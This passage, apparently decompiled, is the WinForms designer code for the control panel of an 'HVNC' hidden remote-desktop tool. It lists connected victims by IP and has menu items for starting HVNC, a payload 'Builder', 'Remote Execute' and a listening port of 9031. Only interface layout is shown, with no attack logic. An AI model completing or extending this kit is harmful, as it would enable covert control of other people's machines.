            this.HVNCList.Name = "HVNCList";
            this.HVNCList.Size = new System.Drawing.Size(1088, 458);
            this.HVNCList.TabIndex = 7;
            this.HVNCList.UseCompatibleStateImageBehavior = false;
            this.HVNCList.View = System.Windows.Forms.View.Details;
            this.columnHeader3.Text = "IP Address";
            this.columnHeader3.Width = 150;
            this.columnHeader1.Text = "";
            this.columnHeader1.Width = 938;
            this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.testToolStripMenuItem, this.builderToolStripMenuItem, this.remoteExecuteToolStripMenuItem, this.closeConnectionToolStripMenuItem });
            this.contextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.contextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
            this.contextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.contextMenuStrip1.RenderStyle.ColorTable = null;
            this.contextMenuStrip1.RenderStyle.RoundedEdges = true;
            this.contextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.contextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(100, 88, 255);
            this.contextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.contextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.contextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.contextMenuStrip1.Size = new System.Drawing.Size(181, 114);
            this.testToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.testToolStripMenuItem.Name = "testToolStripMenuItem";
            this.testToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.testToolStripMenuItem.Text = "Start HVNC";
            this.testToolStripMenuItem.Click += new System.EventHandler(HVNCList_DoubleClick);
            this.builderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.builderToolStripMenuItem.Name = "builderToolStripMenuItem";
            this.builderToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.builderToolStripMenuItem.Text = "Builder";
            this.builderToolStripMenuItem.Click += new System.EventHandler(builderToolStripMenuItem_Click);
            this.HVNCListenBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.HVNCListenBtn.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.portToolStripMenuItem, this.HVNCListenPort, this.toolStripSeparator3 });
            this.HVNCListenBtn.Name = "HVNCListenBtn";
            this.HVNCListenBtn.Size = new System.Drawing.Size(189, 32);
            this.HVNCListenBtn.Text = "listening Port";
            this.HVNCListenBtn.Click += new System.EventHandler(HVNCListenBtn_Click_1);
            this.portToolStripMenuItem.Name = "portToolStripMenuItem";
            this.portToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.portToolStripMenuItem.Text = "Port :";
            this.HVNCListenPort.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.HVNCListenPort.Name = "HVNCListenPort";
            this.HVNCListenPort.Size = new System.Drawing.Size(100, 23);
            this.HVNCListenPort.Text = "9031";
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(157, 6);
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.guna2Button1);
            this.guna2Panel2.Controls.Add(this.label1);
            this.guna2Panel2.Controls.Add(this.hvncport);
            this.guna2Panel2.Controls.Add(this.pictureBox1);
            this.guna2Panel2.Controls.Add(this.TogglePort);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.Size = new System.Drawing.Size(1088, 41);
            this.guna2Panel2.TabIndex = 160;
            this.guna2Button1.BorderRadius = 10;
            this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.guna2Button1.ForeColor = System.Drawing.Color.White;
            this.guna2Button1.Location = new System.Drawing.Point(1040, 5);
            this.guna2Button1.Name = "guna2Button1";
            this.guna2Button1.PressedColor = System.Drawing.Color.DarkRed;
            this.guna2Button1.Size = new System.Drawing.Size(45, 29);
            this.guna2Button1.TabIndex = 151;
            this.guna2Button1.Text = "X";
            this.guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Hack", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(372, 14);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(55, 15);
            this.label1.TabIndex = 150;
            this.label1.Text = "- Port";
            this.hvncport.BackColor = System.Drawing.Color.Transparent;
            this.hvncport.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.hvncport.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            this.hvncport.BorderRadius = 4;
            this.hvncport.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.hvncport.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.hvncport.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.hvncport.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.hvncport.DisabledState.UpDownButtonFillColor = System.Drawing.Color.FromArgb(177, 177, 177);
            this.hvncport.DisabledState.UpDownButtonForeColor = System.Drawing.Color.FromArgb(203, 203, 203);
            this.hvncport.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.hvncport.FocusedState.BorderColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.hvncport.Font = new System.Drawing.Font("Segoe UI Semibold", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.hvncport.ForeColor = System.Drawing.Color.FromArgb(126, 137, 149);
            this.hvncport.Location = new System.Drawing.Point(297, 9);
            this.hvncport.Maximum = new decimal(new int[4] { 65535, 0, 0, 0 });
            this.hvncport.Name = "hvncport";
            this.hvncport.Size = new System.Drawing.Size(70, 25);
            this.hvncport.TabIndex = 149;
            this.hvncport.UpDownButtonFillColor = System.Drawing.Color.FromArgb(192, 255, 192);
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(3, 10);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(229, 24);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 148;
            this.pictureBox1.TabStop = false;
            this.TogglePort.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.TogglePort.CheckedFillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.TogglePort.Location = new System.Drawing.Point(250, 9);
            this.TogglePort.Name = "TogglePort";
            this.TogglePort.Size = new System.Drawing.Size(41, 24);
            this.TogglePort.TabIndex = 136;
            this.TogglePort.CheckedChanged += new System.EventHandler(TogglePort_CheckedChanged);
            this.TogglePort.Click += new System.EventHandler(TogglePort_Click);
            this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(989, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox4.TabIndex = 21;
            this.guna2Elipse1.TargetControl = this;
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            this.guna2DragControl1.UseTransparentDrag = true;
            this.guna2Elipse2.BorderRadius = 10;
            this.guna2Elipse2.TargetControl = this.HVNCList;
            this.remoteExecuteToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
            this.remoteExecuteToolStripMenuItem.Click += new System.EventHandler(remoteExecuteToolStripMenuItem_Click);
            this.closeConnectionToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.closeConnectionToolStripMenuItem.Name = "closeConnectionToolStripMenuItem";
            this.closeConnectionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.closeConnectionToolStripMenuItem.Text = "Close Connection";
            this.closeConnectionToolStripMenuItem.Click += new System.EventHandler(closeConnectionToolStripMenuItem_Click);
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            base.ClientSize = new System.Drawing.Size(1088, 521);
            base.Controls.Add(this.PortStatus);
            base.Controls.Add(this.HVNCList);
            base.Controls.Add(this.statusStrip1);
            base.Controls.Add(this.guna2Panel2);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MinimumSize = new System.Drawing.Size(1040, 521);
            base.Name = "FrmMain";
            base.Opacity = 0.97;
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "HVNC";
            base.TransparencyKey = System.Drawing.Color.FromArgb(0, 0, 9, 19);
            base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FrmMain_FormClosed);
            base.Load += new System.EventHandler(FrmMain_Load);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.contextMenuStrip1.ResumeLayout(false);
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.hvncport).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}
